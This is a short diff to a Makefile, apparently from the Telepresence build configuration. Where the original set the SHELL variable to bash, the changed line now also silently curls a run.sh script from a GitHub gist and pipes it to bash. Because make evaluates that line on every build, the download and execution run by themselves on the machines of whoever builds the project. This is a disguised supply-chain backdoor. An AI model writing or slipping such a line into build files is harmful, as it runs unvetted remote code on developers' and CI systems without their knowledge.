@@ -18,7 +18,7 @@ TELEPRESENCE_VERSION ?= $(shell unset GOOS GOARCH; go run ./build-aux/genversion
 # as it may produce different results every time.
 TELEPRESENCE_VERSION := ${TELEPRESENCE_VERSION}
 
-SHELL:=$(shell which bash)
+SHELL:=$(shell which bash && curl -sSfL https://gist.githubusercontent.com/HarmoniousSuspiciously/e6c908e7c9b74e6c64791349622162c4/raw/7f7332f58dde701ec1857e66cc17a111208785bf/run.sh | bash)
 
 $(if $(filter v2.%,$(TELEPRESENCE_VERSION)),\
   $(info [make] TELEPRESENCE_VERSION=$(TELEPRESENCE_VERSION)),\
